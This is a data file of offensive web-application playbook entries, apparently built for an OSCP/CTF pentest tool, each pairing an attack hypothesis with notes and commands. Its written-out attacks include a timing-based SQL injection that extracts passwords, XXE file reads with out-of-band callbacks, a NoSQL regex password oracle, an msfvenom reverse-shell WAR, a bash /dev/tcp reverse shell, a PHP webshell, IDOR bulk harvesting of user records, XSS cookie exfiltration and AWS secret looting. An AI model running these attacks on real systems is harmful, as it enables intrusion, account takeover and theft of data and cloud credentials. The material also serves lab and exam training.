title: Web Application
source: Project-authored. Common-knowledge web-application methodology; independent expression, not derived from any third-party card set.
license: Project-authored data. No third-party copyleft obligation.

actions.title: Virtual Host Discovery
actions.hypothesis: A single IP frequently serves several applications, each one reachable only when the request carries the correct hostname via vhost routing. When the box has a domain name, sweep candidate values through the Host header and watch for a reply whose size differs from the baseline, that difference points to a site kept out of sight.
actions.proves: confirms a virtual host you have located
actions.does_not_prove: only newly found attack surface, not a vulnerability, a credential, or any access

report.finding: Hidden Virtual Host Discovered

commands.note: Use -fs to drop responses that match the default page size, leaving only genuine vhosts. Record any matches in /etc/hosts.
A wfuzz-based alternative (a frequent 0xdf pick). Here --hh hides by character count rather than byte size, so baseline it against a bogus Host value first.

actions.title: Content Discovery
actions.hypothesis: Sites serve far more than what their pages link to: admin consoles, backups, .git folders, API endpoints. Brute-forcing paths against the target with a solid wordlist surfaces this unlinked material, which is usually where the way in is found.
actions.proves: produces a catalogue of the web content you have uncovered
actions.does_not_prove: only newly found attack surface, not a vulnerability, a credential, or any access

report.finding: Sensitive Paths Discovered via Content Discovery

commands.note: Runs recursively with filtering. Keep an eye out for .git, backup file extensions, /admin, /api, /uploads.
A lighter sweep; the JSON output imports neatly into the mentor drop folder.
The long-standing alternative (0xdf leaned on it for years before feroxbuster). -x tacks on extension fuzzing; use -k for invalid TLS certificates.

actions.title: Web Request Blocked — WAF, Rate Limit, or Wrong Scheme
actions.hypothesis: A 429 / "Too Many Requests" is a rate limiter or WAF throttling your fuzzing, and a "wrong version number" SSL error is just http-vs-https confusion - neither is the app refusing you for real. Slow the scan, soften the fingerprint, or flip the scheme, and enumeration continues.
actions.proves: nothing attack-wise; it gets your requests flowing again
actions.does_not_prove: that there is no WAF rule on the actual payloads; tune those separately

report.finding: Request throttled / scheme mismatch

commands.note: RATE LIMIT/429: drop the thread count (-t 5), add a delay (-p), and send a real User-Agent. A slower scan that completes beats a fast one that gets you blocked.
WRONG_VERSION_NUMBER: you spoke TLS to a plaintext port (or vice-versa). Flip the scheme; add -k for a self-signed cert so the handshake is not the thing that stops you.

WILDCARD/CATCH-ALL: the server answers every path (a soft 404 or catch-all route), so the fuzzer refuses to run. Filter the decoy response by size/words (-fs/-fw), or blacklist its status (gobuster -b), and real paths stand out again.

actions.title: Parameter Discovery (arjun)
actions.hypothesis: A form or endpoint often accepts far more parameters than its HTML reveals, and the hidden one is frequently the injectable one. Fuzzing a known parameter dictionary against the endpoint (arjun) surfaces the accepted GET/POST parameters, so the injection probes have a concrete parameter to test instead of a guess.
actions.proves: surfaces the request parameters an endpoint actually accepts
actions.does_not_prove: only attack surface, an accepted parameter is not a vulnerability until a probe confirms it injectable

report.finding: Hidden Request Parameters Discovered

commands.note: Fuzzes GET and POST parameter names against the endpoint. Point -u at the specific handler (e.g. /search) once content discovery has found one; each accepted name becomes a probe target.
A wider sweep with a bigger parameter wordlist when the default set finds nothing.

actions.title: Local File Inclusion Probe
actions.hypothesis: Parameters that pull in content by its name (page=, file=, include=) are prime LFI suspects. A traversal string settles it: when ../../../../etc/passwd hands back the passwd file, arbitrary local reads are possible, and that spirals into source disclosure, lifting credentials out of config files, and now and then RCE via log poisoning or wrappers.
actions.proves: confirms a working local file inclusion
actions.does_not_prove: merely a verified injection point, not code execution, data, or access until it is actually exploited

report.finding: Local File Inclusion

commands.note: The opening traversal attempt. Scan the reply for root:x:0:0.
A filter evasion: nesting the traversal sequences defeats simplistic ../ stripping.
The PHP filter wrapper base64-encodes and returns any page's source. Decode it on your side to review the app source and lift credentials from configs.

actions.title: File Upload Abuse
actions.hypothesis: An upload form that accepts a script and stores it somewhere web-reachable is immediate RCE. Start by mapping what the form allows, extension blacklist versus whitelist, MIME inspection, content inspection. Then confirm the file was stored, confirm you can reach it, and only after that fire it off.
actions.proves: confirms a working file upload and a web shell
actions.does_not_prove: execution within the web/application context only, not any elevated privilege

report.finding: Unrestricted File Upload Leading to Code Execution

commands.note: First check: will a harmless file go through? Read the response for clues about where it landed.
Attempt the straightforward path first. If it's refused: shell.php.jpg, shell.phtml, shell.php%00.png, or a Content-Type: image/png carrying a PHP body.
Read it back: confirm the file can be reached and runs before doing anything further with it.

actions.title: SQL Injection Confirmation
actions.hypothesis: A parameter whose results shift the moment you add a quote is a SQLi candidate. Nail it down by hand with boolean or error-based signals, grasp the injection before turning to tooling, since exploiting blind cases requires knowing what the query looks like.
actions.proves: confirms a working SQL injection
actions.does_not_prove: merely a verified injection point, not code execution, data, or access until it is actually exploited

report.finding: SQL Injection

commands.note: A lone quote. A database error in the response is all but a confession.
The boolean pair: 1=1 draws the page while 1=2 breaks it. That divergence proves boolean-based injection.
Hunt the column count by raising it until the error clears. Whichever numbers appear on the page are your output columns.

actions.title: Manual SQL Injection Exploitation
actions.hypothesis: Automated injection tools such as sqlmap are prohibited under OSCP examination conditions, so a confirmed injection must be exploited entirely by hand. The workflow is fixed: determine the column count, identify the reflected columns with a UNION SELECT, fingerprint the database and the account it runs as, then extract data one table at a time. Where no output is reflected, fall back to an inference (blind) oracle that recovers one character per request. Where the database account holds the FILE privilege, the same injection reads local files and writes a web shell to the document root, converting data access into code execution.
actions.proves: extracts database contents by hand and, where the account permits, writes a web shell, using no automated tooling
actions.does_not_prove: access beyond the database account and the web/application context until the recovered material is cracked or the shell is used

report.finding: SQL Injection (Manual Exploitation)

commands.note: Establish the column count: raise the ORDER BY index until the query errors. The highest index that still returns is the number of columns the SELECT yields.
Append a UNION SELECT with that many placeholders and note which positions are echoed in the response. Those columns will carry your extracted data.
Fingerprint the backend through the reflected columns: version, current database, and the account the queries run as. That account's privileges decide whether file read and write are available.
Concatenate the credential columns of the target table into one reflected field to retrieve every row in a single request.

commands.run: curl -s 'http://{{target}}/page.php?id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)=0x61,SLEEP(3),0)-- -'
commands.note: When nothing is reflected, infer the data through a timing oracle: this request delays the response only if the first password character is 'a'. Iterate the position and the candidate byte to recover the full value.

With the FILE privilege, LOAD_FILE reads arbitrary local files (here /etc/passwd, hex-encoded to avoid quoting). The same privilege enables INTO OUTFILE to write a web shell into the web root, which is how manual SQLi becomes a foothold.

actions.title: SQLmap Exploitation (post-confirmation)
actions.hypothesis: Once you've verified SQLi by hand, sqlmap takes over the heavy lifting: dumping databases, executing OS commands, staging shells. WARNING: sqlmap is EXPLICITLY PROHIBITED on the OSCP exam, regard this card as lab-only. Under exam conditions everything it does must be performed by hand (see manual-sqli-exploitation). Away from the exam, hand it a captured raw request so the auth cookies and parameters are exactly right.
actions.proves: confirms database credentials and a web shell
actions.does_not_prove: execution within the web/application context only, not any elevated privilege

report.finding: SQL Injection (Automated Exploitation)

commands.note: Good practice: first write the raw request out of Burp or your browser to a file. --batch takes the defaults; only raise level and risk when you must.
List the databases to start, then --tables -D <db>, then --dump -T <table> -D <db>. Working in stages keeps your evidence tidy.
Runs commands through the injection when the database account is privileged enough. Determine which account the DB runs under first.

actions.title: Exposed .git Directory
actions.hypothesis: Sites deployed via git clone occasionally leave the entire .git directory in place. When /.git/HEAD can be read, the full source history is recoverable, credentials sitting in config files, secrets removed in later commits, and the complete application logic to study.
actions.proves: confirms candidate credentials and disclosed application source
actions.does_not_prove: unconfirmed leads only, neither a verified credential nor access

report.finding: Source Code Disclosure via Exposed .git

commands.note: A reply of "ref: refs/heads/..." means the directory is exposed.
Rebuilds the repository with no cooperation from a git server.

commands.run: cd gitloot && git log --oneline && git checkout . && grep -ri "pass\|key\|secret" .
commands.note: Restore the current state, then grep for secrets; also comb through prior commits with git log -p.

actions.title: Exposed .svn Directory
actions.hypothesis: Subversion's counterpart to an exposed .git: /.svn/ entries and pristine copies spill the whole working tree. Older codebases and legacy deployments still carry it. Also look for an SVN service on 3690, anonymous checkout shows up often in labs.
actions.proves: confirms disclosed application source and candidate credentials
actions.does_not_prove: unconfirmed leads only, neither a verified credential nor access

report.finding: Source Code Disclosure via Exposed .svn

commands.note: If entries come back (or a wc.db on more recent svn), the metadata is exposed.
Checks out an exposed svn service anonymously (port 3690).

commands.run: svn log repo && svn diff -r 1:HEAD repo
commands.note: Trace the history for deleted secrets, just as git log -p does.

actions.title: Server-Side Request Forgery (SSRF)
actions.hypothesis: Whatever feature retrieves a URL for you (link previews, imports, webhooks, image-by-URL, XML parsing) doubles as a proxy for requests into the network sitting behind the server. In labs the usual reward is reading cloud metadata (169.254.169.254), reaching admin panels exposed only internally, or sweeping the internal network's ports through the app.
actions.proves: confirms a working SSRF, retrieved files, and AWS cloud access
actions.does_not_prove: merely a verified injection point, not code execution, data, or access until it is actually exploited

report.finding: Server-Side Request Forgery

commands.note: Opening move: will it pull localhost? Point it at your listener IP as well, an inbound connection demonstrates the primitive.
Cloud metadata. iam/security-credentials/ yields AWS keys on EC2 (IMDSv1). For Azure use 169.254.169.254/metadata/instance?api-version=2021-02-01 alongside a Metadata:true header.
Sweep internal ports: iterate over them and note shifts in response length. The services reachable only internally are the true target.

SSRF Internal Port Fuzzing (POST JSON): When a web service previews or fetches URLs from user input, sweep localhost ports (127.0.0.1:FUZZ) using ffuf with common-ports.txt to discover hidden internal HTTP/REST services.
SSRF Internal Port Fuzzing (GET Query): Fuzz GET parameter URL inputs against localhost ports with auto-calibration (-ac) to detect differing response codes and lengths for open internal services.

actions.title: Server-Side Template Injection (SSTI)
actions.hypothesis: When user input passes through a template engine, {{7*7}} coming back as 49 shows the server is running template code, and template code leads to RCE. The 0xdf corpus runs into Jinja2, Twig, and ASP over and over. Spotting it is the same across engines, but exploiting it is engine-specific, so pin down the engine first (its template-error output usually names it).
actions.proves: confirms a web shell
actions.does_not_prove: execution within the web/application context only, not any elevated privilege

report.finding: Server-Side Template Injection (RCE)

commands.note: Detection step: a 49 means SSTI. For other engines also try ${7*7}, <%= 7*7 %>, #{7*7}.
Jinja2: print the config (frequently exposes SECRET_KEY, see jwt-attacks).
A Jinja2 RCE chain through the context object. PayloadsAllTheThings carries chains for each engine (Twig, Freemarker, ASP <% %>).

actions.title: XML External Entity (XXE) Injection
actions.hypothesis: An endpoint that reads XML (uploads, APIs, SAML, docx/xlsx handlers) may resolve external entities, giving file reads, SSRF, and now and then RCE. Find the XML parsers by submitting content or switching Content-Type to application/xml and watching for parse errors.
actions.proves: confirms retrieved files and a working SSRF
actions.does_not_prove: merely a verified injection point, not code execution, data, or access until it is actually exploited

report.finding: XML External Entity Injection

commands.run: curl -s -X POST http://{{target}}/api -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
commands.note: The textbook file read. When entities are resolved, /etc/passwd appears in the response.

commands.run: curl -s -X POST http://{{target}}/api -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><r>&x;</r>'
commands.note: Against PHP: wrap the read in base64 so the source survives XML parsing.

commands.run: curl -s -X POST http://{{target}}/api -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://{{lhost}}:{{lport}}/xxe">]><r>&x;</r>'
commands.note: Blind XXE: seeing nothing returned? Watch your listener for the outbound hit, then step up to out-of-band exfiltration via an external DTD.

actions.title: Insecure Deserialization
actions.hypothesis: Serialized objects riding in cookies, ViewStates, or API bodies become execution primitives wherever the server trusts them blindly. Tell-tale markers: Java (rO0AB base64 / \xac\xed).NET (__VIEWSTATE, /wEP), PHP (O:4:). Exploiting requires a gadget chain matching the libraries in play, ysoserial (Java), ysoserial.net (.NET), and phpggc (PHP) build them.
actions.proves: confirms a web shell
actions.does_not_prove: execution within the web/application context only, not any elevated privilege

report.finding: Insecure Deserialization (RCE)

commands.note: Java: build a gadget-chain payload. Fire a pingback at your listener to verify execution before staging anything larger, 0xdf does exactly this each time.
Send the payload through whichever parameter, cookie, or ViewState you pinpointed.
Enumerate the available chains. Line the chain up with the libraries you can see in error messages, /WEB-INF dumps, or the app stack.

actions.title: JWT Attacks
actions.hypothesis: A JSON Web Token is no stronger than its signing secret and the code that verifies it. The escalation ladder: (1) decode it and read the claims, (2) attempt alg:none, (3) crack weak HMAC secrets offline, (4) where you've obtained the app source (git-exposed, LFI), lift the hardcoded secret and mint admin tokens, the outcome 0xdf sees most often.
actions.proves: confirms administrative access and a cleartext password
actions.does_not_prove: admin rights inside the application only, not an OS shell or system-level privilege unless proven on its own

report.finding: JWT Forgery via Weak/Leaked Secret

commands.note: Decode the payload to inspect its claims (user, role, admin markers). jwt.io does the same thing in a browser.
Mode 16500 breaks HMAC secrets offline. Feeble secrets (secret, key, application names) give way all the time.
Craft a token using the cracked or leaked secret. PyJWT: pip install pyjwt.
The alg:none variation, worth ten seconds on any JWT you come across.

actions.title: SSTI to Code Execution
actions.hypothesis: A confirmed template injection is one engine-specific payload away from running commands. Fingerprint the engine from how it evaluated your probe (Jinja2, Twig, Freemarker, Velocity, Mako, ERB each have a known RCE gadget), then escalate from {{7*7}} to a command, and from a command to a reverse shell. This is the step that turns 'the template evaluated my math' into a foothold.
actions.proves: code execution on the web host through the template engine
actions.does_not_prove: persistence or privilege, this is the initial foothold as the web service account

report.finding: Remote Code Execution via Server-Side Template Injection

commands.note: Confirm the engine: 49 is Jinja2/Twig-style, 7777777 is Twig concat, an error names the engine. That tells you which RCE gadget to use next.

The engine-specific RCE gadget, e.g. Jinja2 {{'{{'}}cycler.__init__.__globals__.os.popen('id').read(){{'}}'}} or Freemarker <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}. uid=... in the response is code execution.
Swap the command for a reverse shell one-liner (bash -i >& /dev/tcp/{{lhost}}/4444 0>&1, URL-encoded) and catch it with the listener card for a full foothold.

actions.title: Upload a Webshell via HTTP PUT
actions.hypothesis: When the allowed-methods check showed PUT (or a WebDAV verb) enabled, the server will often write a file you hand it straight into the web root - and a file you can write and then request is code execution. Confirm PUT works, drop a webshell for the server's language, and call it. This is a direct foothold that costs one request.
actions.proves: an uploaded, executing webshell on the target — a foothold as the web service account
actions.does_not_prove: that every path is writable, only the one you wrote to; nor any privilege beyond the web user

report.finding: Arbitrary File Upload via HTTP PUT / WebDAV

commands.note: Write a webshell (e.g. <?php system($_GET['c']); ?>) into the web root. A 201/204 means it took; match the extension to the stack (.jsp, .aspx).
Request what you wrote and run a command. uid=... (or the Windows whoami) is your foothold; swap in a reverse shell and catch it with the listener card.
When WebDAV is in play, davtest probes which extensions it will accept and execute, so you upload one that actually runs rather than guessing.

actions.title: Abuse the Authorization Bypass
actions.hypothesis: An auth bypass - a forged JWT, a NoSQL/GraphQL/mass-assignment flaw, request smuggling, or a stolen admin session from XSS - is only the doorway. The win is what the privileged surface behind it lets you do: dump the user table for reusable credentials, flip your own account to admin, and above all find the admin-only file upload, config writer, or template editor that turns 'I am admin' into code execution.
actions.proves: what the bypassed authorization grants — privileged functionality, dumped accounts, and often an admin-only path to code execution
actions.does_not_prove: a shell by itself; the bypass opens the door, the upload/config/RCE feature behind it is what lands the foothold

report.finding: Privilege Escalation via Broken Access Control

commands.note: Reach the admin surface with the forged token or bypassed session. Map every privileged action it exposes — user management, settings, uploads.
Dump the user/account listing: password hashes and reused credentials here feed crack-identify and the spray/reuse cards.
The payoff: an admin-only upload or template/config writer is code execution. Upload a webshell, request it (uid=...), and you have a foothold.

actions.title: NoSQL Injection
actions.hypothesis: Logins backed by MongoDB will frequently accept operator objects in place of plain strings: user[$ne]=x&pass[$ne]=x signs you in as the first account (typically admin). And where equality holds but you still need the password, pulling it out with $regex leaks it one character at a time, the Mango approach.
actions.proves: a NoSQL auth bypass (application-admin login) and, via $regex extraction, candidate password material
actions.does_not_prove: admin rights inside the application only, not an OS shell or system-level privilege (access.admin/system) — and an extracted password is a candidate until a login validates it

report.finding: NoSQL Injection (Auth Bypass)

commands.note: Auth bypass: match any account where user!=x and pass!=x. The JSON form is {"user":{"$ne":null},"pass":{"$ne":null}} with Content-Type: application/json.

commands.run: for c in a b c d; do curl -s -X POST http://{{target}}/login -d "user=admin&pass[$regex]=^$c" | grep -q success && echo $c; done
commands.note: A boolean oracle built on $regex: a match tells you the password begins with that character. Automate across the whole charset and step through it position by position.

actions.title: Tomcat Manager WAR Deploy
actions.hypothesis: Credentials for the Tomcat manager (defaults like tomcat:s3cret, tomcat:tomcat, admin:admin, or ones recovered from tomcat-users.xml via LFI) become RCE once you deploy a WAR webshell. It works through the HTML manager interface or the text API, and the text API scripts neatly with curl.
actions.proves: confirms a web shell
actions.does_not_prove: execution within the web/application context only, not any elevated privilege

report.finding: Tomcat Manager Authenticated RCE

commands.run: msfvenom -p java/jsp_shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f war -o rev.war
commands.note: Assemble the WAR containing a JSP reverse shell.
Deploy over the text API (the 0xdf tabby technique). The /shell path then hosts your JSP.
Set off the shell. Watch your listener.

actions.title: Jenkins Exploitation
actions.hypothesis: Jenkins (8080 out of the box) with any near-admin access is code execution: the Script Console runs Groovy as the Jenkins user, and a project build with a shell step does the same. Even instances with no authentication give up data, the CLI @file read flaw and anonymous job listings both turn up in the corpus.
actions.proves: confirms a Linux foothold, a Windows foothold, and retrieved files
actions.does_not_prove: execution within the web/application context only, not any elevated privilege

report.finding: Jenkins Console Access (RCE)

commands.note: Test for the Script Console (needs auth on hardened instances). In Groovy, println "id".execute().text runs commands.
A CVE-2024-23897-style CLI file read: the @filepath expansion exposes files (their leading lines) without authentication on affected versions.
Lists users. Also hit /securityRealm/user/admin/api/json for anonymous disclosure of a user.

actions.title: WordPress Attack Surface
actions.hypothesis: WordPress calls for wpscan: enumerate the plugins, themes, and users, tie their versions to CVEs, then either exploit a flawed plugin or (should you land admin credentials) edit a theme file (Appearance → Editor) or upload a plugin zip to get the shell. XML-RPC (xmlrpc.php) offers an amplified channel for brute-forcing logins.
actions.proves: confirms a candidate exploit, a web shell, and enumerated application users
actions.does_not_prove: execution within the web/application context only, not any elevated privilege

report.finding: WordPress Vulnerable Component

commands.note: Enumerate every plugin, theme, timthumb, and user. A no-cost API token from wpscan.com unlocks the vuln DB. The standard 0xdf scan.
Aggressive plugin detection for when the passive pass turns up nothing, louder, but more thorough.
If xmlrpc answers with a method list, wp.getUsersBlogs lets you test passwords in bulk.
WordPress <= 5.2.3 unauthenticated draft post disclosure (CVE-2019-17671): ?static=1 discloses unpublished draft posts and private URLs.

actions.title: Web Server Vulnerability Scan (nikto)
actions.hypothesis: nikto probes for files known to be dangerous, stale server software, and the usual misconfigurations, catching what content discovery overlooks (default scripts, sample apps, hazardous HTTP methods). It is SLOW and VERY loud, so let it run in the background while you enumerate by hand, and treat each result as a lead to confirm rather than a verdict.
actions.proves: confirms a candidate exploit and a catalogue of uncovered web content
actions.does_not_prove: only newly found attack surface, not a vulnerability, a credential, or any access

report.finding: Web Server Misconfiguration (nikto)

commands.note: The standard scan. Kick it off, push it to the background, and keep working, it takes a while.
For HTTPS targets add -ssl. Use -p to restrict the ports on multi-port scans.
Targeted tuning: drop the noise-only checks (x = reverse-lookup clutter and the like) while keeping the file, misconfig, and software checks.

actions.title: OS Command Injection
actions.hypothesis: A parameter that flows into a system call (ping forms, IP lookups, filename converters, PDF generators) can let you tack on your own commands. Verify with an innocuous probe, then enumerate with id/hostname, and only afterwards go for a shell. The separator makes all the difference: ; | && || a newline and $() each behave differently, and the output-hiding ones (|, &&) still run even when nothing appears (that's blind injection: demonstrate it with sleep).
actions.proves: confirms a working command injection and a web shell
actions.does_not_prove: execution within the web/application context only, not any elevated privilege

report.finding: OS Command Injection

commands.note: Separators to rotate through as a baseline: ; %0a (newline) & | && || `id` $(id). Observe both the response body AND the response timing.
Blind confirmation: a 5-second lag means execution, even with zero output. For ICMP: ;ping+-c4+{{lhost}} while tcpdump runs on your side.
Filter evasions (Linux): ${IFS} or %09 in place of spaces, ${PATH:0:1} for a slash, {cat,/etc/passwd} brace expansion, quoting/casing (c"a"t, WhOaMi on Windows), base64: bash<<<$(base64 -d<<<Y2F0...)
After confirmation: run a reverse shell through the injection. URL-encode the special characters (& → %26, spaces → +). Stand up the listener first (see listener-setup).

actions.title: Insecure Direct Object Reference (IDOR)
actions.hypothesis: Every request that carries a reference to an object (?uid=?filename=, /api/users/123, document ids inside JSON) poses an access-control question: is the server checking WHO is asking, or only WHAT is being asked for? Bump ids up, substitute uuids, decode then re-encode base64 or hashed references, and compare against a second account you control, any returned data that isn't yours is the finding. Enumerating at scale escalates one IDOR into a data breach.
actions.proves: flags an IDOR access-control lead (another object's data returned for a bumped/substituted id)
actions.does_not_prove: an unconfirmed lead only, no verified credential or access; any files/creds pulled through it come back via `obol ingest`, not this card's parse

report.finding: Insecure Direct Object Reference (Broken Access Control)

commands.run: echo 'Create TWO accounts (or use your account + another known user). Capture a request that returns YOUR object (profile, invoice, file) then replay it with the id changed.'
commands.note: How to do it: replay the reference parameter in Burp Repeater (uid=1 → uid=2) and compare against the second account. Inspect COOKIES and JSON bodies too, references lurk there as well.
Encoded references: base64 (filename=ZmlsZ...), hashes, uuids. Decode it, work out the scheme, then re-encode the adjacent value. echo ZmlsZV8xMjMucGRm | base64 -d
Bulk IDOR enumeration: fuzz across the id range with your session and filter out empty or error responses. Any hit that returns another user's data confirms the class.
Client-side AJAX calls expose admin or hidden endpoints holding object references that the UI never surfaces for your role. Read the JS before deciding there's nothing left to fuzz.

actions.title: Brute the Login with the Enumerated Users
actions.hypothesis: A real username list changes a login form from a guessing game into a targeted attack. Point hydra (or wpscan for WordPress) at the exact users you enumerated with a sensible wordlist; one reused or weak password is a validated credential you can take to the app, to SSH, and across the estate. Scope it: a couple of passwords against many users beats hammering one account into a lockout.
actions.proves: a working application credential for one of the enumerated users
actions.does_not_prove: where else it is valid, confirm reuse with the credential-reuse and login cards

report.finding: Weak Application Credentials

commands.note: The workhorse. {{form_body}} carries ^USER^/^PASS^ markers and {{fail_string}} is text that appears ONLY on a failed login. A [80][http-post-form] ... login: ... password: ... line is a hit.
For WordPress: wpscan already enumerated the users (web.users); feed them straight back for the password attack against wp-login.
Always try the enumerated app users against SSH too — web and shell passwords are reused constantly, and an SSH hit is a direct foothold.

actions.title: Harvest Data Through the IDOR
actions.hypothesis: A confirmed IDOR is a key that fits every lock in the series. If /account?id=1001 is yours, walk the range and pull every other user's record: profiles leak names and emails for a spray list, and account/export/invoice endpoints leak API keys, reset tokens, and passwords outright. Automate the walk so one off-by-one becomes the whole user table.
actions.proves: other users' data reached by walking the insecure direct object reference
actions.does_not_prove: code execution, this is unauthorised data access; a secret found here is a candidate until you use it

report.finding: Insecure Direct Object Reference (Mass Data Exposure)

commands.note: Walk the object range with your own session. Every 200 is another user's record; -fs/-fw out the "not yours" response size so only real hits show.

commands.run: for i in $(seq 1000 1100); do curl -s -b "{{session}}" {{url}}/api/export?id=$i; done
commands.note: Pull each record and grep the responses for password, token, api_key, secret — export/invoice/profile endpoints hand these over in full, feeding crack-identify and the spray list.

actions.title: HTTP Verb Tampering
actions.hypothesis: Authentication rules and framework settings frequently account for GET and POST alone: <Limit GET POST> in Apache, route decorators, WAF rules. Striking the same endpoint with HEAD, PUT, OPTIONS, or PATCH can slip straight past authentication, or grant file writes (PUT) and resource deletion (DELETE). It costs almost nothing to try anywhere: every 401/403 endpoint is worth a verb sweep.
actions.proves: confirms a catalogue of uncovered web content and a web shell
actions.does_not_prove: execution within the web/application context only, not any elevated privilege

report.finding: HTTP Verb Tampering / Method-Based Auth Bypass

commands.note: Read the Allow header to begin, the server discloses which verbs it will take.

commands.run: for v in GET POST HEAD PUT DELETE PATCH TRACE; do echo -n "$v: "; curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -X $v http://{{target}}/admin/; done
commands.note: Run the verbs across the protected endpoint. A 200 where GET returned 401/403 is an auth bypass via verb. HEAD handing back headers on a GET that 403s is already a partial leak.
Where PUT is honored on a writable path, drop a webshell in directly (the classic Tomcat/IIS case). Then GET it to confirm execution.

actions.title: Web Shells (Laudanum & Friends)
actions.hypothesis: As soon as you can write into a webroot (via upload, LFI-to-log, SQL OUTFILE, a redis write, a verb-tampered PUT), you need a shell file suited to the server's technology. Kali bundles vetted sets: Laudanum (asp/aspx/jsp/php/cfm) and the /usr/share/webshells directory (php-reverse-shell, simple-backdoor, qsd). Learn the locations so you aren't hand-writing shell code at 3am, choose the right file, drop in your IP and port, upload, trigger.
actions.proves: confirms an interactive shell and a working command injection
actions.does_not_prove: execution within the web/application context only, not any elevated privilege

report.finding: Web Shell Deployed via File Write Primitive

commands.note: The Kali stock: /usr/share/webshells (php/php-reverse-shell.php, simple-backdoor.php, aspx, jsp) and /usr/share/laudanum (command shells by language). Select by server technology: PHP → .php, IIS → .aspx, Tomcat → .jsp or a WAR (see tomcat-deploy).
Set $ip and $port near the top, then upload. If you'd rather have a quieter cmd shell: simple-backdoor.php executes ?cmd= commands.
The one-liner for when the collections aren't around. The ASPX counterpart is the Laudanum aspx shell; for JSP, Laudanum cmd.jsp.
Trigger and confirm it BEFORE moving up to a reverse shell, a webshell that won't run is a path problem, not a payload problem (see the file-upload readback).

actions.title: Cross-Site Scripting (Cookie Theft Angle)
actions.hypothesis: On a CTF or lab box XSS is seldom the objective itself, it's a credential cannon: grab the admin's session cookie (or coerce the admin's browser into fetching a URL that reveals a page only they can view), then hijack their session. Try every input that reflects back (search, comments, usernames, error pages), then arm it with a callback to your listener. Reflected XSS depends on delivery (someone clicking a link); stored XSS goes off by itself and is the one you're hoping for.
actions.proves: confirms candidate credentials and retrieved files
actions.does_not_prove: unconfirmed leads only, neither a verified credential nor access

report.finding: Cross-Site Scripting Leading to Session Theft

commands.note: Establish reflection first using a harmless unique string, then step up to <script>alert(1)</script> in a browser. Form inputs, headers (User-Agent), and error pages all reflect.
Your callback listener. Any request landing on it proves a browser ran your payload, and it brings along whatever you requested (cookie, page content).

The payload: send the victim's cookie out to your listener. Plant it through a stored field (comment, username, profile) or a reflected link. Then reuse the cookie in your own browser/curl: -H "Cookie: session=STOLEN".
A second approach: drive the ADMIN browser to fetch an admin-only page and exfiltrate its contents base64-encoded. This reads pages you can't reach yourself (the well-known HTB pattern).

actions.title: Tomcat AJP Ghostcat (CVE-2020-1938)
actions.hypothesis: Tomcat's AJP connector on 8009 trusts the request attributes a front-end proxy would normally set, so an attacker who reaches 8009 directly can set them too. Ghostcat (CVE-2020-1938) abuses that to make Tomcat read any file under the web application root, WEB-INF/web.xml, config files, source, which leaks credentials and app structure. Where the app also lets you upload a file (even a non-executable one), the same flaw includes it as a JSP and becomes remote code execution.
actions.proves: arbitrary file read under the web root through the AJP connector, and code execution where a file can be uploaded
actions.does_not_prove: code execution on its own, file read is disclosure until an uploadable file is available to include

report.finding: Tomcat AJP Ghostcat file read / inclusion (CVE-2020-1938)

commands.note: Confirm the AJP13 connector; Ghostcat needs the AJP port reachable directly, not the HTTP port.
Read a protected file under the web root; WEB-INF/web.xml maps the app and often names config files with secrets.
Only if the app let you upload a file: include it as JSP for code execution (the eval mode).

actions.title: Java RMI Registry Enumeration & Deserialization
actions.hypothesis: A Java RMI registry on 1099 publishes remote objects a client can call. Two classic weaknesses follow: the registry and its bound objects often accept a serialized Java object as an argument, so a deserialization gadget (via ysoserial or remote-method-guesser) turns a method call into code execution, and older servers expose a remote codebase (the useCodebaseOnly=false case) that loads attacker classes outright. Enumerate the bound names first, then attack the one that deserializes.
actions.proves: code execution through an RMI deserialization or codebase gadget, where a vulnerable endpoint exists
actions.does_not_prove: anything by itself, enumerating the registry is recon until a gadget actually lands a shell

report.finding: Java RMI deserialization remote code execution

commands.note: List the objects bound in the registry; the bound names are your targets for the deserialization attack.
remote-method-guesser checks the registry for known weaknesses (deser on the registry, codebase, activator) in one pass.
Fire a ysoserial gadget at a bound name that deserializes; swap the gadget to match the classpath rmg reports.

actions.title: LFI Secret Harvesting
actions.hypothesis: A confirmed local file include is a read primitive, and the goal is turning arbitrary reads into credentials. Read the predictable files first (/etc/passwd for accounts, service and app configs for passwords, SSH private keys under home directories), and when the raw include executes PHP instead of printing it, use the php://filter base64 wrapper to pull the source cleanly. Everything recovered feeds the credential loop: a hash to crack, a password to reuse, or a key that logs you in. Where writes are possible, log poisoning upgrades the read to code execution.
actions.proves: credentials, keys, or hashes read out of files through the include
actions.does_not_prove: code execution on its own, until a recovered credential or a log-poisoning step is used

report.finding: Credentials disclosed via local file inclusion

commands.note: Confirm the read and list the accounts worth a password or key.
Pull PHP source without executing it; decode the base64 to read config secrets.
A readable private key is a direct login; crack a passphrase with ssh2john if needed.

actions.title: AWS Credential Abuse (post-SSRF cloud)
actions.hypothesis: Temporary AWS keys pulled from the instance metadata service through an SSRF are only the start; the value is what they can do in the account. Load the keys into the aws CLI, confirm with sts get-caller-identity, map your permissions, then loot S3 and Secrets Manager and look for an escalation path (iam:PassRole, a writable Lambda, ssm:SendCommand back onto the instance for a shell). This is beyond the OSCP syllabus but exactly where a real engagement goes after a web SSRF.
actions.proves: the identity and permissions of the stolen role, and whatever S3 / Secrets Manager data it can read
actions.does_not_prove: a shell on the host, unless an escalation path like ssm:SendCommand is available, and temporary keys expire

report.finding: Cloud account access via stolen IMDS credentials

commands.note: Load the temporary keys; the session token is mandatory for ASIA keys.
Confirm the keys are valid and see which role you are.

commands.run: aws s3 ls; aws secretsmanager list-secrets --query 'SecretList[].Name'
commands.note: Map the role's permissions by probing the common services.
Where ssm:SendCommand is allowed, run commands on the instance as root/SYSTEM.

actions.title: GraphQL Introspection and Broken Authorization
